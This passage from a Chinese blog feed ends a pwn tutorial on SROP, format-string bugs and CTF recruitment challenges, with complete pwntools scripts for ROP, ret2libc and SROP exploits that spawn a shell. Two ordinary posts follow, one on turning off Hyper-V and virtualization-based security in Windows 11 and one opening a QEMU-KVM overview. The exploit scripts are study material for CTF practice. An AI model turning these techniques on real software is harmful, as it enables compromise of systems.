shell</p><p>前面都是一样需要通过泄露libc来找到mprotect，后面就是调用mprotect改变bss段执行权限，之后再将asm(<a href="http://shellcraft.sh">shellcraft.sh</a>())写入bss段后执行bss段的代码即可。</p><p>但是这样写完之后发现必须要存在libc源文件才可以，因为plt表中并没有mprotect函数，要么就只能使用系统调用来写。因此使用这个方法远程并没有打通这道题，笔者的代码也不放出来献丑了，网上有很多脚本示例。</p><h2 id="ret2reg">ret2reg</h2><h1 id="07-高级ROP">07 高级ROP</h1><h2 id="SROP">SROP</h2><p>当我们在构造溢出时有syscall但是没有操控rax的ROPgadget，这时候我们就可以使用SROP控制寄存器值。</p><h3 id="signal-机制">signal 机制</h3><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/ProcessOfSignalHandlering.png" alt="ProcessOfSignalHandlering"></p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。**需要注意的是，这一部分是在用户进程的地址空间的。**之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</li></ol><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/signal2-stack.png" alt="signal2-stack"></p><p>由于pwntools现在已经支持构造signal Frame，因此我们就不看具体的代码了，感兴趣的可以自行查看。</p><h3 id="攻击原理">攻击原理</h3><p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p><ul><li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</li><li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li></ul><p>说到这里，其实，SROP 的基本利用原理也就出现了，我们可以通过控制用户地址空间的数据和结构间接控制寄存器的值。下面举两个简单的例子。</p><h3 id="利用">利用</h3><p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/srop-example-1.png" alt="signal2-stack"></p><p>当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。</p><p>上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可。</p><ul><li><strong>控制栈指针。</strong></li><li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li></ul><p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p><blockquote><p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p><ul><li><strong>可以通过栈溢出来控制栈的内容</strong></li><li>需要知道相应的地址<ul><li><strong>“/bin/sh”</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall</strong></li><li><strong>sigreturn</strong></li></ul></li><li>需要有够大的空间来塞下整个 sigal frame</li></ul></blockquote><h3 id="示例">示例</h3><p>来一道ciscn_2019_s_3，关于SROP的题。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251119152544417.png" alt="image-20251119152544417"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251119152600545.png" alt="image-20251119152600545"></p><p>首先看这道题发现是栈溢出之后，在程序中并未找到任何关于system函数和&quot;/bin/sh&quot;字符串的任何信息，而在64位操作系统中，传参都是通过寄存器，因此我们需要找到控制寄存器的方法，这里观察之后发现程序给出了gadgets函数，在内部将rax赋值为0xf，不难想到这就是SROP所需要的系统调用号，因此在这之后再触发syscall即可，找一下syscall在哪</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251119202415166.png" alt="image-20251119202415166"></p><p>找到之后就可以构造execve或system系统调用了，但是还需要一个&quot;/bin/sh&quot;字符串及地址，这时候我们有两种构造方式，第一种是多次调用sigreturn，第一次调用read或get读入&quot;/bin/sh&quot;到bss段，第二次使用sigreturn直接调用system。第二种方式就是直接在溢出的时候将&quot;/bin/sh&quot;写入，由于这时候写入的位置在栈上，因此我们需要泄露栈地址，但是不得不说这样做比第一种方式更加优雅。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251120110735787.png" alt="image-20251120110735787"></p><p>那么我们如何来泄露栈地址呢，我们先调试一下，看一下溢出需要填充的字符数，这里发现当执行read时，rbp==rsp，也就是说此时不需要多填充8字节以覆盖返回地址。并且观察到下一个栈中存放的之前的栈指针为0x7fffffffe538，因此我们可以知道相对于我们写入的字符串的位置0x7fffffffe410，其偏移地址为0x128。</p><p>而虽然栈的地址会变化，但是栈上偏移并不会变，也就是说，下一个栈中存放的之前的栈指针和我们写入的字符串的相对位置是固定的，因此我们只要泄露出下一个栈中存放的数据，再使用这个数据减去偏移地址就能得到程序运行时我们写入的字符串的地址。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251119202220606.png" alt="image-20251119202220606"></p><p>思路基本上就是这样，接下来就需要构造POC一步步pwn掉：</p><p>下面给出pwntools集成的SROP攻击构造方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">frame=SigreturnFrame()<br>frame.rax=<span class="hljs-number">59</span><br>frame.rdi=binsh<br>frame.rip=syscall<br>frame.rsi=<span class="hljs-number">0</span><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span>+p64(gadget)+p64(syscall)+<span class="hljs-built_in">str</span>(frame)<br>p.send(payload)<br></code></pre></td></tr></table></figure><p>POC构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment">#Important!!!!!!!!!!Important!!!!!!!!!!</span><br>vuln_addr = <span class="hljs-number">0x004004ED</span><br><br>sig_addr = <span class="hljs-number">0x04004DA</span><br><br>syscall_addr = <span class="hljs-number">0x0400501</span><br><br>offset = <span class="hljs-number">0x128</span><br>payload1 = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)+p64(vuln_addr)<br>p.send(payload1)<br><br>binsh = u64(p.recv()[<span class="hljs-number">32</span>:<span class="hljs-number">40</span>]) - offset<br>log.success(<span class="hljs-string">&#x27;binsh = &#x27;</span> + <span class="hljs-built_in">hex</span>(binsh))<br><br>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = binsh<br>frame.rsi = <span class="hljs-number">0x0</span><br>frame.rdx = <span class="hljs-number">0x0</span><br>frame.rip = syscall_addr<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">2</span>+p64(sig_addr)+p64(syscall_addr)+<span class="hljs-built_in">bytes</span>(frame)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="08-Format-String">08 Format String</h1><p>格式化字符串（英语：format string）是一些程序设计语言的输入/输出库中能将字符串参数转换为另一种形式输出的函数。例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/Printf.svg.png" alt="Printf.svg"></p><h2 id="原理">原理</h2><p>我们上面说，格式化字符串函数是根据格式化字符串来进行解析的 。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制</strong>。比如说’%s’表明我们会输出一个字符串参数。</p><p>对于上面的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">some</span> value<br><span class="hljs-number">3.14</span><br><span class="hljs-number">123456</span><br>addr of <span class="hljs-string">&quot;red&quot;</span><br>addr of format <span class="hljs-built_in">string</span>: Color <span class="hljs-built_in">%s</span>...<br></code></pre></td></tr></table></figure><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p><ul><li>当前字符不是 %，直接输出到相应标准输出。</li><li>当前字符是 %， 继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是 %, 输出 %</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>那么假设，此时我们在编写程序时候，写成了下面的样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure><p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p><ol><li>解析其地址对应的字符串</li><li>解析其内容对应的整形值</li><li>解析其内容对应的浮点值</li></ol><p>对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。</p><p>这基本就是格式化字符串漏洞的基本原理了。</p><h2 id="利用-2">利用</h2><h1 id="09-天璇战队2025招新">09 天璇战队2025招新</h1><h2 id="ret">ret</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011153617006.png" alt="image-20251011153617006"></p><p>简单栈溢出，有system函数有&quot;/bin/sh&quot;：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011153635272.png" alt="image-20251011153635272"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011153952599.png" alt="image-20251011153952599"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011154013118.png" alt="image-20251011154013118"></p><p>接下来调试看需要填充的字符数以及覆盖返回地址为system即可，由于是64位程序，函数调用时的参数顺序第一个为rdi（前文有详细顺序描述）。也就是构造的栈需要将返回地址覆盖为pop rdi，ret; 随后紧跟&quot;/bin/sh&quot;的地址，随后再调用system函数即可。</p><p>找pop rdi：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011170721170.png" alt="image-20251011170721170"></p><p>这里写完之后发现一直报错，由于是64位操作系统，在 x86_64 上，从 ROP 链 “ret 到一个函数（system）” 而不是通过 call 指令，会造成函数入口时 <code>RSP</code> 没有满足 16 字节对齐，GLIBC 的某些实现会在函数内部依赖对齐（导致 crash）。插入一个ret即可。</p><blockquote><p>为什么要插 <code>ret</code>？</p><ul><li>x86_64 要求在函数被 <code>call</code> 进入时：RSP 在被 <code>call</code> 指令入栈返回地址后应是 16 字节对齐（函数入口时 RSP % 16 == 0）。</li><li>ROP 用 <code>ret</code>/gadget 链跳转到 <code>system</code> 时，没有 <code>call</code> 的那一步，可能导致 <code>RSP</code> 在 <code>system</code> 入口处变为了 8 的偏移，从而触发某些 lib 内部的断言或造成异常访问（尤其是带 SSE/栈局部对齐敏感的实现）。</li></ul></blockquote><p>写poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;./ret&#x27;</span>)<br><br>pop_rdi_ret = <span class="hljs-number">0x400773</span><br>ret_gadget = <span class="hljs-number">0x400501</span><br><br>system_addr = <span class="hljs-number">0x400530</span><br>bin_sh_addr = <span class="hljs-number">0x400794</span><br><br>offset = <span class="hljs-number">0x10</span> + <span class="hljs-number">8</span><br><br>r.recvuntil(<span class="hljs-string">b&quot;Just a simple sign-in!&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * offset+ p64(ret_gadget) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) <br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="libc">libc</h2><p>题目提示的很明显，ret2libc的题，看看基本情况</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011172432843.png" alt="image-20251011172432843"></p><p>栈不可执行，无所谓，libc也不需要执行栈中代码，查看一下</p><p><img src="C:%5CUsers%5C24512%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20251011172932377.png" alt="image-20251011172932377"></p><p>简单的栈溢出，查看后发现可用函数中没有system，字符串中也没有&quot;/bin/sh&quot;，但是可以找到puts函数，那么显而易见需要plt表来泄露偏移地址，找到system函数即可。先找填充：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011173630256.png" alt="image-20251011173630256"></p><p>接下来构造栈，首先调用puts函数，泄露puts和gets的got表地址，随后再计算偏移偏移，构造出system函数在got表中的地址，最后调用system函数获取控制权限。64位系统调用函数传参通过rdi rsi这样的方式传，详情上网搜。找一下rdi和ret：<br><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251012211533903.png" alt="image-20251012211533903"></p><p>这样栈对齐也有了，就能搓脚本了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./pwnlibc&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwnlibc&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-comment"># 使用简单ROP（如果可用）</span><br>pop_rdi = <span class="hljs-number">0x400713</span>  <span class="hljs-comment"># 使用 ROPgadget 查找</span><br>puts_got = e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>ret_gadget = <span class="hljs-number">0x4004c9</span><br><br>main_addr = e.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x10</span> + <span class="hljs-number">8</span>)<br><br><span class="hljs-comment"># 第一步：泄露puts地址</span><br>payload1 = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>p.recvuntil(<span class="hljs-string">&quot;No backdoors this time!\n&quot;</span>)<br>p.sendline(payload1)<br><br><span class="hljs-comment"># 接收泄露地址</span><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;Leaked puts: &quot;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br><br><span class="hljs-comment"># 计算libc基地址</span><br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>log.success(<span class="hljs-string">&quot;libc base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system_addr))<br>log.success(<span class="hljs-string">&quot;/bin/sh: &quot;</span> + <span class="hljs-built_in">hex</span>(binsh_addr))<br><br><span class="hljs-comment"># 第二步：system(&quot;/bin/sh&quot;)</span><br>p.recvuntil(<span class="hljs-string">&quot;No backdoors this time!\n&quot;</span>)<br>payload2 = padding + p64(ret_gadget) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 添加返回地址</span><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>但是这个脚本实际运行的时候却发现libc库不对，将其换成我本地的&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;就成功了（具体原因尚不清楚）</p><h2 id="easy-syscall">easy_syscall</h2><p>题目给的提示很充足，我们查看一下程序信息：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251015114510414.png" alt="image-20251015114510414"></p><p>64位程序，看一下程序代码：<br><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251015114903872.png" alt="image-20251015114903872"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251015115008822.png" alt="image-20251015115008822"></p><p>漏洞就存在于函数vuln中，也是栈溢出，既然题目提示了那就找一下ROPgadget：</p><p>这道题没有设置rax的ROPgadget</p><h2 id="sentences">sentences</h2><h2 id="dinner-chall">dinner-chall</h2><h2 id="Pivot">Pivot</h2><h2 id="uniform">uniform</h2><h1 id="buu">buu</h1>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows11关闭“基于虚拟化的安全性”</title>
    <link href="/2025/03/27/Windows11%E5%85%B3%E9%97%AD%E2%80%9C%E5%9F%BA%E4%BA%8E%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E2%80%9D/"/>
    <url>/2025/03/27/Windows11%E5%85%B3%E9%97%AD%E2%80%9C%E5%9F%BA%E4%BA%8E%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E2%80%9D/</url>
    
    <content type="html"><![CDATA[<p>在一次嵌套虚拟化的实验里，笔者忽然发现KVM报错。在查询资料并且在VMWare打开了CPU虚拟化之后悲催的发现出现了一个从来没有见过的错误</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327165416993.png" alt="image-20250327165416993"></p><p>如果选择否就直接关闭虚拟机了，选择是就会出现这样的错误</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327165531474.png" alt="image-20250327165531469"></p><p>查了一下发现是微软的 Hyper-V 与 VMware Workstation 之间是冲突的，需要关闭Hyper-V。本以为是个很简单的事情，结果笔者的主机是非常稀有的体质，折腾了一下午。故记录一下解决这个问题的时候90%的人都没遇到过的情况（悲）。</p><p>以下是关闭Hyper-V的步骤，读者可以依次尝试。</p><h1 id="关闭Hyper-V">关闭Hyper-V</h1><p>在开始之前，让我们先查看几个关键的设置。</p><p>首先是硬件CPU的虚拟化支持，可以按<code>Ctrl+Shift+Esc</code>打开任务管理器，随后查看性能分组，查看CPU的状态。如图所示CPU虚拟化已启用是正常的，笔者一开始这里就是启用的，所以就没有管，如果未启用请自行搜索资料。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327170744680.png" alt="image-20250327170744680"></p><p>之后是打开计算机 <code>设置-&gt;隐私和安全性-&gt;Windows安全中心-&gt;设备安全性-&gt;内核隔离详细信息</code>，之后将内存完整性关闭，如图所示为正确的配置。也就是这个位置狠狠坑了我一把，先说结论，内存完整性下面的本地机构保护也需要关闭。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327171229700.png" alt="image-20250327171229700"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327200008628.png" alt="image-20250327200008628"></p><h2 id="Windows功能关闭Hyper-V">Windows功能关闭Hyper-V</h2><p>打开<code>控制面板-&gt;程序-&gt;启用或关闭Windows功能</code></p><p>关闭hyper-v，windows虚拟机监控程序以及虚拟机平台。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327172039367.png" alt="image-20250327172039367"></p><p>如果你和笔者一样是家庭版，那你也会看不到hyper-v功能。笔者这里是自己找的安装Hyper-V的脚本，但是其实看不到就不用管了，这里不用担心。</p><p>重启后生效，重启后如果还不能正常打开虚拟机就往下继续看。</p><h2 id="命令行关闭">命令行关闭</h2><p>1、打开管理员PowerShell。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327170244070.png" alt="image-20250327170244070"></p><p>2、输入bcdedit /set hypervisorlaunchtype off并回车。（若要开启则将off改为auto）</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327170306899.png" alt="image-20250327170306899"></p><p>3、查看选项状态。</p><p>关闭后记得重启，重启后如果还不能正常打开虚拟机就往下继续看。</p><h2 id="服务关闭">服务关闭</h2><p>进入服务，禁用Hyper-V相关的服务</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327173029812.png" alt="image-20250327173029812"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327173131049.png" alt="image-20250327173131049"></p><p>到这里，笔者还是不能解决，仔细查看系统信息之后发现基于虚拟化的安全性一直都没有被关闭。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327173434912.png" alt="image-20250327173434912"></p><p>很无奈，只能继续寻找关于关闭虚拟化安全的资料。</p><h1 id="关闭“基于虚拟化的安全性”">关闭“基于虚拟化的安全性”</h1><h2 id="组策略关闭（家庭版无效）">组策略关闭（家庭版无效）</h2><p>由于笔者是家庭版，无法使用组策略方法（哪怕在家庭版安装组策略也是无效的。专业版Win11也有可能无效。家庭版开了组策略也找不到Device/Credential Guard），所以笔者又选择了注册表方法，但是这里还是将过程记录。</p><p>1、Win+R运行——输入gpedit.msc并回车 打开组策略。</p><p>2、找到“计算机配置——管理模板——系统——Device Guard”右侧的“打开基于虚拟化的安全”策略，将其修改为“已禁用”</p><p>3、查看选项状态。</p><h2 id="注册表关闭">注册表关闭</h2><p>1、Win+R运行——输入regedit——回车 打开注册表。</p><p>2、找到“HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard”目录右侧的&quot;EnableVirtualizationBasedSecurity&quot;（如果存在），将其DWORD值修改为0。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327174109879.png" alt="image-20250327174109879"></p><p>重启生效，重启后如果还不能正常打开虚拟机就往下继续看。</p><h2 id="PowerShell脚本关闭">PowerShell脚本关闭</h2><p><strong>方法四：PowerShell脚本关闭（需要win10系统版本1607以上）</strong></p><p>1、下载脚本文件并解压缩。链接：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=53337">https://www.microsoft.com/en-us/download/details.aspx?id=53337</a></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327195542927.png" alt="image-20250327195542927"></p><p>2、以管理员模式打开命令行——输入set-ExecutionPolicy RemoteSigned并回车——输入Y并回车</p><p>3、复制刚刚解压缩的脚本路径。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327195641601.png" alt="image-20250327195641601"></p><p>4、在管理员模式的命令行中输入cd 你的脚本路径（命令行右键粘贴）并回车——输入dir并回车查看当前目录内容是否为脚本目录。</p><p>5、输入.\DG_Readiness_Tool_v3.6.ps1 -Disable（注意前面有个点）并回车——等待运行完成后重启电脑，按照提示关闭Credential Guard和Device Guard（按照F3-Enter-F3-Enter来进行输入）。</p><p>按道理来说进行到这一步基本上就解决了，但是我的电脑死活关不上这个虚拟化安全，我找遍了资料都没有，最后在一篇关闭Hyper-V的文章中发现还要在设置里将本地机构保护关闭（浪费了我一下午，真的悲伤）。</p><p>好了，到这里本文就差不多结束了。如果还没有解决的话读者不妨试试下载一个雷电模拟器，打开之后雷电模拟器会提示你的系统打开了虚拟化，点重启修复就试试（真的有用且方便）。</p>]]></content>
    
    
    
    <tags>
      
      <tag>虚拟化</tag>
      
      <tag>虚拟机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QEMU-KVM虚拟化技术</title>
    <link href="/2025/02/14/QEMU-KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF/"/>
    <url>/2025/02/14/QEMU-KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="虚拟化技术概述">虚拟化技术概述</h1><p>虚拟化是一个广义的术语，在计算机方面通常是指计算元件在虚拟的基础上而不是真实的基础上运行（<strong>对计算机物理资源的抽象，实现资源的模拟、隔离和共享</strong>）。虚拟化技术可以使得一台计算机上原本只能够一台计算机使用的硬件设备能够同时运行多个逻辑计算机，每个逻辑计算机可运行不同的操作系统，并且应用程序都可以在相互独立的空间内运行而互不影响，从而显著提高计算机的工作效率。</p><p>在实际的生产环境中，虚拟化技术主要用来解决高性能的物理硬件产能过剩和老的、旧的硬件产能过低的重组、重用，透明化底层物理硬件，从而最大化的利用物理硬件，对资源充分利用。</p><p>我们将此虚拟的环境称之为VM（Virtual Machine）。安装在这个环境之上的系统我们称为<strong>Guest OS</strong>（客户系统）；运行VMM的操作系统则称<strong>Host OS</strong>（本地操作系统）。</p><h1 id="虚拟化的本质">虚拟化的本质</h1><p>分区：在整个物理服务器上运行多个虚拟机；隔离：在同一服务器上的虚拟机相互隔离；封装：整个虚拟机都保存在文件中，可以通过移动文件的方式迁移；相对硬件独立：无需修改任何服务上运行的虚拟机；</p><h1 id="虚拟化分类">虚拟化分类</h1><p>从虚拟化的实现方式来看，虚拟化架构主要有三种形式：寄居虚拟化架构、裸金属虚拟化架构和操作系统虚拟化架构。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%9E%B6%E6%9E%84%E5%88%86%E7%B1%BB.png" alt="虚拟化架构分类"></p><p>以虚拟化技术维度，主要有：全虚拟化、半虚拟化、硬盘辅助虚拟化。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E5%88%86%E7%B1%BB.png" alt="虚拟化技术分类"></p><h1 id="虚拟化架构">虚拟化架构</h1><h2 id="裸金属虚拟化-Type1">裸金属虚拟化(Type1)</h2><p>裸机虚拟化指的是，<strong>Hypervisor 直接运行在硬件上，即以 Hypervisor 作为 Host OS 直接管控硬件资源</strong>。例如 <code>VMware ESXI</code> 便是采用此种架构的 